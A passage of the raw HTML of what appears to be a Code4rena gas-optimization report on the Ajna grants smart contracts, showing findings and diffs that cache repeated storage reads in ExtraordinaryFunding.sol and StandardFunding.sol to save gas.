3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-02] State variables can be cached instead of re-reading them from storage</h2>\n<p>Caching of a state variable replaces each <code>Gwarmaccess (100 gas)</code> with a much cheaper stack read.</p>\n<p><strong>Note: Some view functions are included below since they are called within state mutating functions.</strong></p>\n<p>Total Instances: <code>6</code></p>\n<p>Estimated Gas Saved: <code>6 * 100 = 600</code></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L206-L215\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L206-L215</a></p>\n<h3 id=\"cache-_fundedextraordinaryproposalslength-to-save-1-sload\" style=\"position:relative;\"><a href=\"#cache-_fundedextraordinaryproposalslength-to-save-1-sload\" aria-label=\"cache _fundedextraordinaryproposalslength to save 1 sload permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache <code>_fundedExtraordinaryProposals.length</code> to save 1 SLOAD</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"129\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ExtraordinaryFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">206</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_getMinimumThresholdPercentage</span><span class=\"mtk1\">() </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">207</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// default minimum threshold is 50</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">208</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_fundedExtraordinaryProposals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) { </span><span class=\"mtk3\">// @audit: 1st sload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">209</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.5</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">210</span><span class=\"mtk1\">:        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">211</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// minimum threshold increases according to the number of funded EFM proposals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">212</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">213</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.5</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\"> + (</span><span class=\"mtk12\">_fundedExtraordinaryProposals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> * (</span><span class=\"mtk7\">0.05</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">// @audit: 2nd sload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">214</span><span class=\"mtk1\">:        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">215</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"130\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/ExtraordinaryFunding.sol b/src/grants/base/ExtraordinaryFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 4a70abb..0acc0a3 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/ExtraordinaryFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/ExtraordinaryFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -205,12 +205,13 @@ abstract contract ExtraordinaryFunding is Funding, IExtraordinaryFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function _getMinimumThresholdPercentage() internal view returns (uint256) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // default minimum threshold is 50</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (_fundedExtraordinaryProposals.length == 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 length = _fundedExtraordinaryProposals.length;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (length == 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             return 0.5 * 1e18;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // minimum threshold increases according to the number of funded EFM proposals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            return 0.5 * 1e18 + (_fundedExtraordinaryProposals.length * (0.05 * 1e18));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            return 0.5 * 1e18 + (length * (0.05 * 1e18));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L388-L391\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L388-L391</a></p>\n<h3 id=\"cache-return-value-from-_validatecalldatastargets_-values_-calldatas_-to-save-1-sload\" style=\"position:relative;\"><a href=\"#cache-return-value-from-_validatecalldatastargets_-values_-calldatas_-to-save-1-sload\" aria-label=\"cache return value from _validatecalldatastargets_ values_ calldatas_ to save 1 sload permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache return value from <code>_validateCallDatas(targets_, values_, calldatas_)</code> to save 1 SLOAD</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"131\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">388</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">newProposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokensRequested</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_validateCallDatas</span><span class=\"mtk1\">(</span><span class=\"mtk12\">targets_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">values_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">calldatas_</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// check proposal parameters are valid and update tokensRequested</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">389</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// revert if proposal requested more tokens than are available in the distribution period</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">390</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">newProposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokensRequested</span><span class=\"mtk1\"> &gt; (</span><span class=\"mtk12\">currentDistribution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fundsAvailable</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">9</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">10</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidProposal</span><span class=\"mtk1\">(); </span><span class=\"mtk3\">// @audit: unnecessary sload, emit return value from internal call</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"132\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 928b337..cf158b2 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -385,10 +385,11 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // store new proposal information</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         newProposal.proposalId      = proposalId_;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         newProposal.distributionId  = currentDistribution.id;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        newProposal.tokensRequested = _validateCallDatas(targets_, values_, calldatas_); // check proposal parameters are valid and update tokensRequested</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint128 _tokensRequested = _validateCallDatas(targets_, values_, calldatas_); // check proposal parameters are valid and update tokensRequested</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        newProposal.tokensRequested = _tokensRequested;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // revert if proposal requested more tokens than are available in the distribution period</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (newProposal.tokensRequested &gt; (currentDistribution.fundsAvailable * 9 / 10)) revert InvalidProposal();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (_tokensRequested &gt; (currentDistribution.fundsAvailable * 9 / 10)) revert InvalidProposal();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         emit ProposalCreated(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             proposalId_,</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L641-L649\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L641-L649</a></p>\n<h3 id=\"cache-existingvotevotesused-to-save-1-sload\" style=\"position:relative;\"><a href=\"#cache-existingvotevotesused-to-save-1-sload\" aria-label=\"cache existingvotevotesused to save 1 sload permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache <code>existingVote.votesUsed</code> to save 1 SLOAD</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"133\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">641</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">support</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">existingVote</span><span class=\"mtk1\">.</span><span class=\"mtk12\">votesUsed</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">support</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">existingVote</span><span class=\"mtk1\">.</span><span class=\"mtk12\">votesUsed</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) { </span><span class=\"mtk3\">// audit: 1st sload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">642</span><span class=\"mtk1\">:                </span><span class=\"mtk3\">// if the vote is in the opposite direction of a previous vote,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">643</span><span class=\"mtk1\">:                </span><span class=\"mtk3\">// and the proposal is already in the votesCast array, revert can&#39;t change direction</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">644</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FundingVoteWrongDirection</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">645</span><span class=\"mtk1\">:            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">646</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">647</span><span class=\"mtk1\">:                </span><span class=\"mtk3\">// update the votes cast for the proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">648</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">existingVote</span><span class=\"mtk1\">.</span><span class=\"mtk12\">votesUsed</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">voteParams_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">votesUsed</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// @audit: 2nd sload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">649</span><span class=\"mtk1\">:            }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"134\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 928b337..9fc8ca3 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -638,14 +638,15 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             FundingVoteParams storage existingVote = votesCast[uint256(voteCastIndex)];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // can&#39;t change the direction of a previous vote</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            if (support == 0 &amp;&amp; existingVote.votesUsed &gt; 0 || support == 1 &amp;&amp; existingVote.votesUsed &lt; 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            int256 _votesUsed = existingVote.votesUsed;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if (support == 0 &amp;&amp; _votesUsed &gt; 0 || support == 1 &amp;&amp; _votesUsed &lt; 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 // if the vote is in the opposite direction of a previous vote,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 // and the proposal is already in the votesCast array, revert can&#39;t change direction</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 revert FundingVoteWrongDirection();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 // update the votes cast for the proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                existingVote.votesUsed += voteParams_.votesUsed;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                existingVote.votesUsed = _votesUsed + voteParams_.votesUsed;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L703-L743\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L703-L743</a></p>\n<h3 id=\"use-already-cached-distributionid-to-save-2-sloads\" style=\"position:relative;\"><a href=\"#use-already-cached-distributionid-to-save-2-sloads\" aria-label=\"use already cached distributionid to save 2 sloads permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Use already cached <code>distributionId</code> to save 2 SLOADs</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"135\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">703</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">proposal_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// @audit: 1st sload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">743</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">screeningVotesCast</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposal_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">account_</span><span class=\"mtk1\">] += </span><span class=\"mtk12\">votes_</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// @audit: 2nd &amp; 3rd sload</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"136\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 928b337..15e21fb 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -740,7 +740,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // record voters vote</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        screeningVotesCast[proposal_.distributionId][account_] += votes_;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        screeningVotesCast[distributionId][account_] += votes_;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // emit VoteCast instead of VoteCastWithParams to maintain compatibility with Tally</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         emit VoteCast(</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L706-L743\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L706-L743</a></p>\n<h3 id=\"cache-screeningvotescastdistributionidaccount_-to-save-1-sload\" style=\"position:relative;\"><a href=\"#cache-screeningvotescastdistributionidaccount_-to-save-1-sload\" aria-label=\"cache screeningvotescastdistributionidaccount_ to save 1 sload permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache <code>screeningVotesCast[distributionId][account_]</code> to save 1 SLOAD</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"137\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">706</span><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">screeningVotesCast</span><span class=\"mtk1\">[</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">account_</span><span class=\"mtk1\">] + </span><span class=\"mtk12\">votes_</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">_getVotesScreening</span><span class=\"mtk1\">(</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">account_</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InsufficientVotingPower</span><span class=\"mtk1\">(); </span><span class=\"mtk3\">// @audit: 1st sload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 